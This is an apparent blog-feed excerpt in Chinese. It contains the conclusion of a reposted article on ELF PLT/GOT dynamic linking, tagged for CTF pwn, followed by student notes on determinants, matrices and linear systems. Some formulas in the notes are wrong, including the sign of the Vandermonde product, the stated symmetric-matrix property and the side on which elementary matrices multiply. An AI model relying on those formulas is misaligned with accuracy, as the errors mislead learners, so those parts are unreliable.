<p>最后总结一下：plt是属于调用方的一段胶水代码。有多少个模块就可能存在多少个<code>.plt</code>段，而这个<code>.plt</code>段还是单独为这一个模块服务的。比如模块a调用了模块b。那a中就会有一个单独的<code>.plt</code>属于模块a用来间接寻址模块b。且这个<code>.plt</code>段会一个配套的<code>.got.plt</code>段来存储最后的真正的地址。那如果还有一个模块c也调用了模块b。那c需要一个自己的``.plt<code>和</code>.got.plt```来完成相同的工作。</p>
<p>由于有全局符号介入的机制的存在，即使是自己调用自己，那也需要在自己的模块里面生成一段<code>.plt</code>代码和相应的<code>.got.plt</code>入口来完成对自己的代码的“相对寻址”，虽然明明知道自己要调用的代码与自己的相对位置是多少。但是我们就是偏偏不能那样做。因为由于全局符号介入的关系，我们最终调用的符号自己，可能不真的我们自己。</p>
<p>下面我画了一个图来总结呈现下这个关系吧，以防止你和我一样被绕晕：</p>
<p><img src="/image/post/transship/0005/1.jpg" alt=""></p>
<center>不同模块之间的.plt和.got.plt 之间的关系</center>

<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>最后我们还是以问题结束吧：</p>
<ul>
<li>动态库中的PLT表与主程序中的PLT表是否为同一份？<ul>
<li>答：不是同一份</li>
</ul>
</li>
<li>动态库中的GOT.PLT表与主程序中的GOT.PLT表是否为同一份？<ul>
<li>答：同样不是同一份</li>
</ul>
</li>
<li>PLT表是代码还是数据？<ul>
<li>这个是代码，不是数据。虽然&lt;自我修养&gt;中说是一个个的项</li>
</ul>
</li>
<li>动态库内部函数之间的调用为何不直接使用相对地址调用？<ul>
<li>因为有全局符号介入的存在.导致实际调用有可能不是调用自己的函数的情况。<br>上面并没有论证<code>.got</code>是否为同一个，看完上面的内容，或许你已经有了答案。</li>
</ul>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.zhihu.com/question/21249496">Linux动态链接为什么要用PLT和GOT表？</a><br>[2] <a href="https://blog.werner.wiki/elf-plt-got-static-analysis/">ELF 文件 PLT 和 GOT 静态分析</a></p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数知识点</title>
    <url>/2025/01/06/%E6%9D%82/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大一上就给我上强度，真是。</p>
<p>线代真是杂得很。<del>和高数真是完全不一样的风情。</del></p>
<hr>
<p>以下是正文：</p>
<h1 id="1-行列式"><a href="#1-行列式" class="headerlink" title="1 行列式"></a>1 行列式</h1><h2 id="1-1-排列"><a href="#1-1-排列" class="headerlink" title="1.1 排列"></a>1.1 排列</h2><h3 id="1-1-1-排列定义"><a href="#1-1-1-排列定义" class="headerlink" title="1.1.1 排列定义"></a>1.1.1 排列定义</h3><p>由自然数$1,2,\cdots,n$按一定次序排成的数组称为一个$n$<strong>元排列</strong>，记为$p_1 p_2 \cdots p_n$。</p>
<h3 id="1-1-2-逆序数"><a href="#1-1-2-逆序数" class="headerlink" title="1.1.2 逆序数"></a>1.1.2 逆序数</h3><p>一个排列中，大的数在校的数前面有序对的个数，称为这个排列的<strong>逆序数</strong>，记作$\tau(a_1 a_2 \cdots a_n)$</p>
<h3 id="1-1-3-奇偶排列"><a href="#1-1-3-奇偶排列" class="headerlink" title="1.1.3 奇偶排列"></a>1.1.3 奇偶排列</h3><p>逆序对为奇数的排列被称为<strong>奇排列</strong>，逆序对为偶数的排列被称为<strong>偶排列</strong>。</p>
<h2 id="1-2-行列式的基础性质"><a href="#1-2-行列式的基础性质" class="headerlink" title="1.2 行列式的基础性质"></a>1.2 行列式的基础性质</h2><h3 id="1-2-1-2阶及3阶行列式的计算"><a href="#1-2-1-2阶及3阶行列式的计算" class="headerlink" title="1.2.1 2阶及3阶行列式的计算"></a>1.2.1 2阶及3阶行列式的计算</h3><p>略</p>
<h3 id="1-2-2-n阶行列式的定义"><a href="#1-2-2-n阶行列式的定义" class="headerlink" title="1.2.2 n阶行列式的定义"></a>1.2.2 n阶行列式的定义</h3><script type="math/tex; mode=display">D=\left| a_{ij} \right|=det(a_{ij})=
\left|\begin{array}{cccc}
a_{11} & a_{12} & \cdots & a_{1n}\\
a_{21} & a_{22} & \cdots & a_{2n}\\
\vdots & \vdots & & \vdots \\
a_{n1} & a_{n2} & \cdots & a_{nn}\\
\end{array}\right|
= \sum\limits_{p_1 p_2 \cdots p_n} (-1)^{\tau(p_1 p_2 \cdots p_n)}a_{1p_1}a_{2p_2}\cdots a_{np_n}</script><h3 id="1-2-3-行列式的3种变形"><a href="#1-2-3-行列式的3种变形" class="headerlink" title="1.2.3 行列式的3种变形"></a>1.2.3 行列式的3种变形</h3><ul>
<li>对换行列式的$i,j$两行（或列），记作$r_i\leftrightarrow r_j$（或$c_i\leftrightarrow c_j$）。</li>
<li>从行列式的第$i$行（或列）提出公因子$k$，记作$r_i\div k$（或$c_i \div k$）。</li>
<li>把行列式的第$j$行（或列）的$k$倍加到第$i$行（或列）上，记作$r_i+kr_j$（或$c_i+kc_j$）。</li>
</ul>
<h3 id="1-2-4-行列式的其他性质"><a href="#1-2-4-行列式的其他性质" class="headerlink" title="1.2.4 行列式的其他性质"></a>1.2.4 行列式的其他性质</h3><p>行列式转置后仍然不变。即$D=D^T$</p>
<h3 id="1-2-5-特殊的行列式"><a href="#1-2-5-特殊的行列式" class="headerlink" title="1.2.5 特殊的行列式"></a>1.2.5 特殊的行列式</h3><h4 id="1-2-5-1-上、下三角行列式"><a href="#1-2-5-1-上、下三角行列式" class="headerlink" title="1.2.5.1 上、下三角行列式"></a>1.2.5.1 上、下三角行列式</h4><script type="math/tex; mode=display">\left|\begin{array}{cccc}
a_{11} & a_{12} & a_{13} & \cdots & a_{1n}\\
0 & a_{22} & a_{23} & \cdots & a_{2n}\\
0 & 0 & a_{33} & \cdots & a_{3n}\\
\vdots & \vdots & \vdots & \ddots & \vdots \\
0 & 0 & 0 & \cdots & a_{nn}\\
\end{array}\right| = 
\left|\begin{array}{cccc}
a_{11} & 0 & 0 & \cdots & 0\\
a_{21} & a_{22} & 0 & \cdots & 0\\
a_{31} & a_{32} & a_{33} & \cdots & 0\\
\vdots & \vdots & \vdots & \ddots & \vdots \\
a_{n1} & a_{n2} & a_{n3} & \cdots & a_{nn}\\
\end{array}\right|
= \prod\limits_{i=1}^{n}a_{ii}</script><h4 id="1-2-5-2-范德蒙德行列式"><a href="#1-2-5-2-范德蒙德行列式" class="headerlink" title="1.2.5.2 范德蒙德行列式"></a>1.2.5.2 范德蒙德行列式</h4><script type="math/tex; mode=display">\left|\begin{array}{cccc}
1 & 1 & 1 & \cdots & 1\\
a_1 & a_2 & a_3 & \cdots & a_n\\
a_1^2 & a_2^2 & a_3^2 & \cdots & a_n^2\\
\vdots & \vdots & \vdots & & \vdots\\
a_1^{n-1} & a_2^{n-1} & a_3^{n-1} & \cdots & a_n^{n-1}
\end{array}\right|
=\prod\limits_{1 \le i < j \le n}(a_i-a_j)</script><h2 id="1-3-行列式的展开"><a href="#1-3-行列式的展开" class="headerlink" title="1.3 行列式的展开"></a>1.3 行列式的展开</h2><h3 id="1-3-1-行列式按单行（或列）展开"><a href="#1-3-1-行列式按单行（或列）展开" class="headerlink" title="1.3.1 行列式按单行（或列）展开"></a>1.3.1 行列式按单行（或列）展开</h3><h4 id="1-3-1-1-余子式和代数余子式"><a href="#1-3-1-1-余子式和代数余子式" class="headerlink" title="1.3.1.1 余子式和代数余子式"></a>1.3.1.1 余子式和代数余子式</h4><p>在$n$阶行列式$D$中，划去$a_{ij}$所在的第$i$行和第$j$列，余下的元素按原来的顺序构成一个$n-1$阶行列式，记作$M_{ij}$，称为元素$a_{ij}$的<strong>余子式</strong>。</p>
<p>记$A_{ij}=(-1)^{i+j}M_{ij}$，称$A_{ij}$为元素$a_{ij}$的<strong>代数余子式</strong>。</p>
<h4 id="1-3-1-2-行列式展开的定理"><a href="#1-3-1-2-行列式展开的定理" class="headerlink" title="1.3.1.2 行列式展开的定理"></a>1.3.1.2 行列式展开的定理</h4><p>按行展开：$D=\sum\limits_{i=1}^{n}a_{ik}A_{ik}$，其中$k=1,2,\cdots,n$。</p>
<p>按列展开：$D=\sum\limits_{i=1}^{n}a_{ki}A_{ki}$，其中$k=1,2,\cdots,n$。</p>
<h3 id="1-3-2-行列式多行多列展开（拉普拉斯定理）"><a href="#1-3-2-行列式多行多列展开（拉普拉斯定理）" class="headerlink" title="1.3.2 行列式多行多列展开（拉普拉斯定理）"></a>1.3.2 行列式多行多列展开（拉普拉斯定理）</h3><h4 id="1-3-2-1-更广义的余子式和代数余子式的定义"><a href="#1-3-2-1-更广义的余子式和代数余子式的定义" class="headerlink" title="1.3.2.1 更广义的余子式和代数余子式的定义"></a>1.3.2.1 更广义的余子式和代数余子式的定义</h4><ul>
<li>$k$<strong>阶子式</strong>：在$n$阶行列式$D$中，任取$k$行$k$列，其交点处的$k^2$个元素按原来的相对位置构成一个$k$阶行列式$M$，称为行列式$D$的一个$k$<strong>阶子式</strong>。</li>
<li>$k$<strong>阶子式的余子式</strong>：在$D$中划去取出该子式的对应的$k$行$k$列，剩下的$n-k$阶行列式$M^{\ast}$，称为$k$<strong>阶子式的余子式</strong>。</li>
<li>$k$<strong>阶子式的代数余子式</strong>：设$k$阶子式所在$D$中的行号与列号分别为$i_1,i_2,\cdots,i_k$和$j_1,j_2,\cdots,j_k$（<strong>tips:不是</strong>$k^2$<strong>个元素的行号和列号和</strong>），则$(-1)^{i_1+i_2+\cdots+i_k+j_1+j_2+\cdots+j_k}M^{\ast}$称为$M$的代数余子式。</li>
</ul>
<h4 id="1-3-2-2-拉普拉斯定理"><a href="#1-3-2-2-拉普拉斯定理" class="headerlink" title="1.3.2.2 拉普拉斯定理"></a>1.3.2.2 拉普拉斯定理</h4><p>先任选并选定$k$行（或列），再枚举所有$k$列（或行）的取法（即$n$中选$k$，共$C_n^k$种），对于这样选出的$C^k_n$个子式$M_1,M_2,\cdots,M_{C_n^k}$和$C_n^k$个对应的代数余子式$A_1,A_2,\cdots,A_{C_n^k}$有：<br>$D=\sum\limits^{C_n^k}_{i=1}M_iA_i$</p>
<h4 id="1-3-2-3-特殊的多行多列展开"><a href="#1-3-2-3-特殊的多行多列展开" class="headerlink" title="1.3.2.3 特殊的多行多列展开"></a>1.3.2.3 特殊的多行多列展开</h4><script type="math/tex; mode=display">
\left|\begin{array}{cccc}
a_{11} & \cdots & a_{1n} & 0 & \cdots & 0 \\
\vdots & & \vdots & \vdots &  & \vdots \\
a_{n1} & \cdots & a_{n} & 0 & \cdots & 0 \\
c_{11} & \cdots & c_{1n} & b_{11} & \cdots & b_{m1} \\
\vdots & & \vdots & \vdots &  & \vdots \\
c_{m1} & \cdots & c_{mn} & b_{m1} & \cdots & b_{mm}
\end{array} \right|=
\left|\begin{array}{cccc}
a_{11} & \cdots & a_{1n} \\
\vdots & & \vdots \\
a_{n1} & \cdots & a_{nn}
\end{array}\right|
\left|\begin{array}{cccc}
b_{11} & \cdots & b_{1m} \\
\vdots & & \vdots \\
b_{m1} & \cdots & b_{mm}
\end{array} \right|</script><p>按后面分块矩阵的写法$det(\begin{matrix} A &amp; 0 \\ C &amp; B\end{matrix})=det(A)det(B)$，$A,B$均为方阵。</p>
<h2 id="1-4-行列式的计算"><a href="#1-4-行列式的计算" class="headerlink" title="1.4 行列式的计算"></a>1.4 行列式的计算</h2><ul>
<li>2阶或3阶的直接算。</li>
<li>先运用3种变形处理。</li>
<li>综合运用：<ul>
<li>行列式按行列展开降低阶数；</li>
<li>化为上下三角行列式；</li>
<li>化为范德蒙德行列式等已有结论的行列式。</li>
</ul>
</li>
</ul>
<h2 id="1-5-行列式的应用（克拉默法则）"><a href="#1-5-行列式的应用（克拉默法则）" class="headerlink" title="1.5 行列式的应用（克拉默法则）"></a>1.5 行列式的应用（克拉默法则）</h2><p>设含有$n$个未知量$x_1,x_2,\cdots,x_n$的$n$个方程的线性方程组为：</p>
<script type="math/tex; mode=display">\begin{cases}
a_{11}x_1+a_{12}x_2+\cdots+a_{1n}x_n=b_1,\\
a_{21}x_1+a_{22}x_2+\cdots+a_{2n}x_n=b_2,\\
\cdots \cdots \cdots\\
a_{n1}x_1+a_{n2}x_2+\cdots+a_{nn}x_n=b_n,\\
\end{cases}</script><p>记其系数行列式为$D=\left|\begin{array}{cccc}<br>a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n}\\<br>a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n}\\<br>\vdots &amp; \vdots &amp; &amp; \vdots \\<br>a_{n1} &amp; a_{n2} &amp; \cdots &amp; a_{nn}\\<br>\end{array}\right|$</p>
<p>若方程组的系数行列式$D\neq 0$则方程组有唯一解$x_1=\frac{D_1}{D},x_2=\frac{D_2}{D},\cdots,x_n=\frac{D_n}{D}$。</p>
<p>其中<script type="math/tex">D_k=D=\left|\begin{array}{cccc}
a_{1,1} &  \cdots & a_{1,k-1} & b_1 & a_{1,k+1} & \cdots & a_{1, n}\\
a_{2,1} &  \cdots & a_{2,k-1} & b_2 & a_{2,k+1} & \cdots & a_{2, n}\\
\vdots & & \vdots & \vdots & \vdots & & \vdots \\
a_{n,1} &  \cdots & a_{n,k-1} & b_n & a_{n,k+1} & \cdots & a_{n, n}
\end{array}\right|</script></p>
<p>这个法则在后面的线性方程组的学习中会更深入。</p>
<h1 id="2-矩阵基础"><a href="#2-矩阵基础" class="headerlink" title="2 矩阵基础"></a>2 矩阵基础</h1><h2 id="2-1-特殊矩阵"><a href="#2-1-特殊矩阵" class="headerlink" title="2.1 特殊矩阵"></a>2.1 特殊矩阵</h2><ul>
<li>对角矩阵$\Lambda =diag(a_1,a_2,…,a_n)=<br>\begin{pmatrix}<br>a_1 &amp; &amp; &amp;\\<br>&amp; a_2 &amp; &amp;\\<br>&amp; &amp; \ddots &amp;\\<br>&amp; &amp; &amp; a_n<br>\end{pmatrix}$</li>
<li>上、下三角矩阵</li>
<li>单位矩阵$E=\begin{pmatrix}<br>1 &amp; &amp; &amp;\\<br>&amp; 1 &amp; &amp;\\<br>&amp; &amp; \ddots &amp;\\<br>&amp; &amp; &amp; 1<br>\end{pmatrix}$，数量矩阵$kE$</li>
<li>零矩阵$0$</li>
<li>行矩阵（行向量）、列矩阵（列向量）</li>
</ul>
<h2 id="2-2-矩阵与行列式"><a href="#2-2-矩阵与行列式" class="headerlink" title="2.2 矩阵与行列式"></a>2.2 矩阵与行列式</h2><p>有$n$阶方阵$A=(a_{ij})$的元素所构成的行列式（各元素的位置不变）称为方阵$A$的行列式。记作$\left| A \right|$或$det A$或$det(a_{ij})$。<br>即</p>
<script type="math/tex; mode=display">\left| A\right| = det A = det(a_{ij}) = \left|\begin{array}{cccc}
a_{11} & a_{12} & \cdots & a_{1n}\\
a_{21} & a_{22} & \cdots & a_{2n}\\
\vdots & \vdots & & \vdots \\
a_{n1} & a_{n2} & \cdots & a_{nn}\\
\end{array}\right|</script><p>性质：</p>
<ul>
<li>$\left| A\right| = \left| A^T\right|$</li>
<li>$\left| \lambda A\right| = \lambda^n\left| A\right|$</li>
<li>$\left| AB\right| = \left| A\right| \left| B\right|$</li>
</ul>
<h2 id="2-3-矩阵基本运算"><a href="#2-3-矩阵基本运算" class="headerlink" title="2.3 矩阵基本运算"></a>2.3 矩阵基本运算</h2><h3 id="2-3-1-矩阵的加法（减法）和乘法"><a href="#2-3-1-矩阵的加法（减法）和乘法" class="headerlink" title="2.3.1 矩阵的加法（减法）和乘法"></a>2.3.1 矩阵的加法（减法）和乘法</h3><p>略</p>
<h3 id="2-3-2-矩阵转置"><a href="#2-3-2-矩阵转置" class="headerlink" title="2.3.2 矩阵转置"></a>2.3.2 矩阵转置</h3><p>矩阵$A$的转置，记为$A^T$。</p>
<h4 id="2-3-2-1-矩阵转置的性质"><a href="#2-3-2-1-矩阵转置的性质" class="headerlink" title="2.3.2.1 矩阵转置的性质"></a>2.3.2.1 矩阵转置的性质</h4><p>关于转置的性质有：</p>
<ul>
<li>$(A^T)^T=A$</li>
<li>$(A+B)^T=A^T+B^T$</li>
<li>$(kA)^T=kA^T$</li>
<li>$(AB)^T=B^TA^T$ （tips：并不是$A^TB^T$）</li>
</ul>
<h4 id="2-3-2-2-对称矩阵"><a href="#2-3-2-2-对称矩阵" class="headerlink" title="2.3.2.2 对称矩阵"></a>2.3.2.2 对称矩阵</h4><p>定义$A^T=A$的矩阵为对称矩阵。</p>
<p>性质：$A^T=T \iff AB=BA$</p>
<h2 id="2-4-分块矩阵"><a href="#2-4-分块矩阵" class="headerlink" title="2.4 分块矩阵"></a>2.4 分块矩阵</h2><p>原则：只要子矩阵能够进行运算那就行。<br>其他略。</p>
<h2 id="2-5-初等矩阵和矩阵的初等变换"><a href="#2-5-初等矩阵和矩阵的初等变换" class="headerlink" title="2.5 初等矩阵和矩阵的初等变换"></a>2.5 初等矩阵和矩阵的初等变换</h2><h3 id="2-5-1-矩阵的三种初等行（列）变换"><a href="#2-5-1-矩阵的三种初等行（列）变换" class="headerlink" title="2.5.1 矩阵的三种初等行（列）变换"></a>2.5.1 矩阵的三种初等行（列）变换</h3><ul>
<li>交换矩阵的两行（或列），如交换$i,j$两行，记作$r_i\leftrightarrow r_j$（或$c_i \leftrightarrow c_j$）。</li>
<li>以一个非零数$k$乘矩阵的某行，如将数$k$乘第$i$行（或列），记作$kr_i$（或$kc_i$）。</li>
<li>把矩阵某一行的$k$倍加到另一行（或列），如将第$j$行（或列）乘$k$加到第$i$行（或列），记作$r_i+kr_j$（或$c_i+kc_j$）。</li>
</ul>
<h3 id="2-5-2-矩阵的等价"><a href="#2-5-2-矩阵的等价" class="headerlink" title="2.5.2 矩阵的等价"></a>2.5.2 矩阵的等价</h3><p>若矩阵$A$经过有限次初等变换变成矩阵$B$，则称矩阵$A$与矩阵$B$等价，记作$A\sim B$。</p>
<p>符合如下性质：</p>
<ul>
<li>$A\sim A$。</li>
<li>若$A\sim B$，则$B\sim A$。</li>
<li>若$A\sim B,B\sim C$，则$A\sim C$。</li>
</ul>
<h3 id="2-5-3-初等矩阵及其与初等变换的关系"><a href="#2-5-3-初等矩阵及其与初等变换的关系" class="headerlink" title="2.5.3 初等矩阵及其与初等变换的关系"></a>2.5.3 初等矩阵及其与初等变换的关系</h3><h4 id="2-5-3-1-初等矩阵"><a href="#2-5-3-1-初等矩阵" class="headerlink" title="2.5.3.1 初等矩阵"></a>2.5.3.1 初等矩阵</h4><p>对单位矩阵$E$进行一次初等变换得到的矩阵称为初等矩阵。</p>
<ul>
<li>$E$交换$i,j$行（列）的得到的矩阵记为$E(i\leftrightarrow j)=\begin{pmatrix}<br>1 &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; \\<br>&amp; \ddots &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; \\<br>&amp; &amp; 1 &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; \\<br>&amp; &amp; &amp; 0 &amp; &amp; \cdots &amp; &amp; 1 &amp; &amp; &amp; \\<br>&amp; &amp; &amp; &amp; 1 &amp; &amp; &amp; &amp; &amp; &amp; \\<br>&amp; &amp; &amp; \vdots &amp; &amp; \ddots &amp; &amp; \vdots &amp; &amp; &amp; \\<br>&amp; &amp; &amp; &amp; &amp; &amp; 1 &amp; &amp; &amp; &amp; \\<br>&amp; &amp; &amp; 1 &amp; &amp; \cdots &amp; &amp; 0 &amp; &amp; &amp; \\<br>&amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; 1 &amp; &amp; \\<br>&amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; \ddots &amp; \\<br>&amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; &amp; 1 \\<br>\end{pmatrix}$</li>
<li>$E$的第$i$行（列）乘非零常数$k$得到的矩阵记为$E(i(k))=\begin{pmatrix}<br>1 &amp; &amp; &amp; &amp; &amp; &amp; \\<br>&amp; \ddots &amp; &amp; &amp; &amp; &amp; \\<br>&amp; &amp; 1 &amp; &amp; &amp; &amp; \\<br>&amp; &amp; &amp; k &amp; &amp; &amp; \\<br>&amp; &amp; &amp; &amp; 1 &amp; &amp; \\<br>&amp; &amp; &amp; &amp; &amp; \ddots &amp; \\<br>&amp; &amp; &amp; &amp; &amp; &amp; 1 \\<br>\end{pmatrix}$</li>
<li>$E$的第$j$行乘数$k$加到第$i$行上（或$E$的第$i$列乘数$k$加到第$j$列上）得到的矩阵记为$E(i+j(k))=\begin{pmatrix}<br>1 &amp; &amp; &amp; &amp; &amp; &amp; \\<br>&amp; \ddots &amp; &amp; &amp; &amp; &amp; \\<br>&amp; &amp; 1 &amp; \cdots &amp; k &amp; &amp; \\<br>&amp; &amp; &amp; \ddots &amp; \vdots &amp; &amp; \\<br>&amp; &amp; &amp; &amp; 1 &amp; &amp; \\<br>&amp; &amp; &amp; &amp; &amp; \ddots &amp; \\<br>&amp; &amp; &amp; &amp; &amp; &amp; 1 \\<br>\end{pmatrix}$</li>
</ul>
<p>性质：因为是初等变换来的，所以这些矩阵都是可逆的。</p>
<h4 id="2-5-3-2-初等矩阵与初等变换的等价性"><a href="#2-5-3-2-初等矩阵与初等变换的等价性" class="headerlink" title="2.5.3.2 初等矩阵与初等变换的等价性"></a>2.5.3.2 初等矩阵与初等变换的等价性</h4><p>$A$是一个$m\times n$矩阵，对$A$施行一次初等行（列）变换，相当于用一个相应的$m(n)$初等矩阵左（右）乘$A$。</p>
<h3 id="2-5-4-行阶梯形矩阵、行最简形矩阵、标准形"><a href="#2-5-4-行阶梯形矩阵、行最简形矩阵、标准形" class="headerlink" title="2.5.4 行阶梯形矩阵、行最简形矩阵、标准形"></a>2.5.4 行阶梯形矩阵、行最简形矩阵、标准形</h3><p>对任意一个矩阵<strong>只做初等行变换</strong>可以得到行阶梯形矩阵、行最简形矩阵。</p>
<p><strong>行阶梯形矩阵</strong>的特点是：</p>
<ul>
<li>零行位于非零行下方</li>
<li>各非零行的首非零元（左起第一个非零元）只出现在上一行非零元的右边。</li>
<li>即$\begin{pmatrix}<br>X &amp; X &amp; X &amp; X \\<br>0 &amp; X &amp; X &amp; X \\<br>0 &amp; 0 &amp; 0 &amp; X \\<br>0 &amp; 0 &amp; 0 &amp; 0<br>\end{pmatrix}$是行阶梯形矩阵，而$\begin{pmatrix}<br>X &amp; X &amp; X &amp; X \\<br>0 &amp; X &amp; X &amp; X \\<br>0 &amp; X &amp; X &amp; X \\<br>0 &amp; 0 &amp; 0 &amp; X<br>\end{pmatrix}$不是。</li>
</ul>
<p><strong>行最简形矩阵</strong>，是更进一步的行阶梯形矩阵，的特点是：</p>
<ul>
<li>各非零行的首非零元都是1</li>
<li>各个首非零元所在列的其他元素都是0</li>
</ul>
<p><strong>标准形</strong>：任何一个矩阵$A_{m\times n}$，都可以经过有限次初等变换（可能行和列初等变换都需要），化为标准形<script type="math/tex">\begin{pmatrix}
1 & & & & & \\
& \ddots & & & & \\
& & 1 & & & \\
& & & 0 & & \\
& & & & \ddots & \\
& & & & & 0
\end{pmatrix} = \begin{pmatrix}
E_r & 0 \\
0 & 0
\end{pmatrix}_{m\times n}</script></p>
<h2 id="2-6-矩阵求逆（奇异矩阵）"><a href="#2-6-矩阵求逆（奇异矩阵）" class="headerlink" title="2.6 矩阵求逆（奇异矩阵）"></a>2.6 矩阵求逆（奇异矩阵）</h2><p>对于方阵$A$，若存在方阵使得$B$使得$AB=BA=E$，则称$A$为可逆矩阵，$B$为$A$的逆矩阵，记作$A^{-1}$。</p>
<p>可逆的矩阵也被称作非奇异矩阵，不可逆矩阵被称作奇异矩阵。</p>
<h3 id="2-6-1-矩阵的逆存在的条件"><a href="#2-6-1-矩阵的逆存在的条件" class="headerlink" title="2.6.1 矩阵的逆存在的条件"></a>2.6.1 矩阵的逆存在的条件</h3><ul>
<li>$\left| A\right| \neq 0$</li>
<li>$A$可以被表示称若干个初等矩阵的乘积，或者说$A$可以通过初等变换转换为单位矩阵$E$，又或者说$A$的标准形是$E$。</li>
<li>$r(A)=n$，见（4 向量与矩阵的秩）。</li>
</ul>
<h3 id="2-6-2-矩阵逆的性质"><a href="#2-6-2-矩阵逆的性质" class="headerlink" title="2.6.2 矩阵逆的性质"></a>2.6.2 矩阵逆的性质</h3><ul>
<li>若$A$可逆，$AA^{-1}=E,\left| A\right| \left| A^{-1}\right|=1$</li>
<li>若$A$可逆，$(A^{-1})^{-1}=A$</li>
<li>若$A$可逆且$k\neq 0$，$(kA)^{-1}=k^{-1}A^{-1}$</li>
<li>若可逆矩阵$A,B$的乘积$AB$可逆，且有$(AB)^{-1}=B^{-1}A^{-1}$（tips：不是$A^{-1}B^{-1}$）</li>
<li>若$A$可逆， 则$A^T$也可逆，且$(A^T)^{-1}=(A^{-1})^T$</li>
</ul>
<h3 id="2-6-3-求解矩阵的逆"><a href="#2-6-3-求解矩阵的逆" class="headerlink" title="2.6.3 求解矩阵的逆"></a>2.6.3 求解矩阵的逆</h3><h4 id="2-6-3-1-伴随矩阵法"><a href="#2-6-3-1-伴随矩阵法" class="headerlink" title="2.6.3.1 伴随矩阵法"></a>2.6.3.1 伴随矩阵法</h4><p>$n$阶行列式$\left| A\right|$的各个元素$a_{ij}$的代数余子式$A_{ij}$所构成的矩阵<script type="math/tex">A^{\ast}=\begin{pmatrix}
A_{11} & A_{12} & \cdots & A_{n1} \\
A_{12} & A_{22} & \cdots & A_{n2} \\
\vdots & \vdots &  & \vdots \\
A_{1n} & A_{2n} & \cdots & A_{nn} \\
\end{pmatrix}</script>称为$A$的<strong>伴随矩阵</strong>。</p>
<p><strong>Warning:$A_{ij}$会放在$ (j,i) $的位置上，最好先求$(A^{\ast})^T$再求$A^{\ast}$比较不会出错。</strong></p>
<p>可以证明$AA^{\ast}=\left| A\right|E$，从而知$A^{-1}=\frac{A^{\ast}}{\left| A\right|}$</p>
<h4 id="2-6-3-2-初等变换法"><a href="#2-6-3-2-初等变换法" class="headerlink" title="2.6.3.2 初等变换法"></a>2.6.3.2 初等变换法</h4><p>利用目标矩阵<strong>初等行变换</strong>（<strong>tips:只能进行初等行变换，不能进行初等列变换</strong>）与初等矩阵右乘目标矩阵的等价性，我们只需<script type="math/tex">\begin{pmatrix}
A & E
\end{pmatrix} \mathop{\sim}\limits^{初等行变换} \begin{pmatrix}
E & A^{-1}
\end{pmatrix}</script></p>
<p>即可得到目标矩阵的逆矩阵。</p>
<h2 id="2-7-矩阵其他概念"><a href="#2-7-矩阵其他概念" class="headerlink" title="2.7 矩阵其他概念"></a>2.7 矩阵其他概念</h2><h3 id="2-7-1-子式"><a href="#2-7-1-子式" class="headerlink" title="2.7.1 子式"></a>2.7.1 子式</h3><p>就是行列式子式概念的扩展。</p>
<p>矩阵的$k$<strong>阶子式</strong>：在矩阵$A_{m\times n}(m,n\geq k)$中，任取$k$行$k$列，其交点处的$k^2$个元素按原来的相对位置构成一个$k$阶行列式$M$，称为矩阵$A$的一个$k$<strong>阶子式</strong>。</p>
<h3 id="2-7-2-矩阵的秩"><a href="#2-7-2-矩阵的秩" class="headerlink" title="2.7.2 矩阵的秩"></a>2.7.2 矩阵的秩</h3><p>矩阵$A$的秩记作$r(A)$，这个概念在<strong>4向量与矩阵的秩</strong>中是核心概念</p>
<h3 id="2-7-3-矩阵的迹、特征值、特征向量与矩阵的半角化"><a href="#2-7-3-矩阵的迹、特征值、特征向量与矩阵的半角化" class="headerlink" title="2.7.3 矩阵的迹、特征值、特征向量与矩阵的半角化"></a>2.7.3 矩阵的迹、特征值、特征向量与矩阵的半角化</h3><p>方阵$A$的迹记作$tr(A)$，是方阵对角线上的和。<br>其他概念略。</p>
<p>这四个概念在<strong>6矩阵的特征值与二次型</strong>中是核心概念。</p>
<h1 id="3-线性方程组"><a href="#3-线性方程组" class="headerlink" title="3 线性方程组"></a>3 线性方程组</h1><p>建议<strong>3线性方程组</strong>和<strong>4向量与矩阵的秩</strong>交叉来看。</p>
<h2 id="3-1-核心概念定义"><a href="#3-1-核心概念定义" class="headerlink" title="3.1 核心概念定义"></a>3.1 核心概念定义</h2><p>承继在<strong>1.5克拉默法则</strong>中所提到的，对于线性方程组（n未知量m个方程）</p>
<script type="math/tex; mode=display">\begin{cases}
a_{11}x_1+a_{12}x_2+\cdots+a_{1n}x_n=b_1,\\
a_{21}x_1+a_{22}x_2+\cdots+a_{2n}x_n=b_2,\\
\cdots \cdots \cdots\\
a_{m1}x_1+a_{m2}x_2+\cdots+a_{mn}x_n=b_m,\\
\end{cases}</script><p>约定<strong>系数矩阵</strong><script type="math/tex">A=\begin{pmatrix}
a_{11} & a_{12} & \cdots & a_{1n}\\
a_{21} & a_{22} & \cdots & a_{2n}\\
\vdots & \vdots & & \vdots \\
a_{m1} & a_{m2} & \cdots & a_{mn}\\
\end{pmatrix}</script><br>矩阵（列向量）$b=(b_1,b_2,\cdots,b_m)^T,x=(x_1,x_2,\cdots,x_n)^T$</p>
<p>约定<strong>增广矩阵</strong>$B=(A,b)$</p>
<p>约定当$b=0$时称方程组为<strong>齐次线性方程组</strong>，否则称<strong>非齐次线性方程组</strong>。</p>
<p>线性方程组的等价表达：</p>
<ul>
<li>第一种如本章开头</li>
<li>第二种$Ax=b$</li>
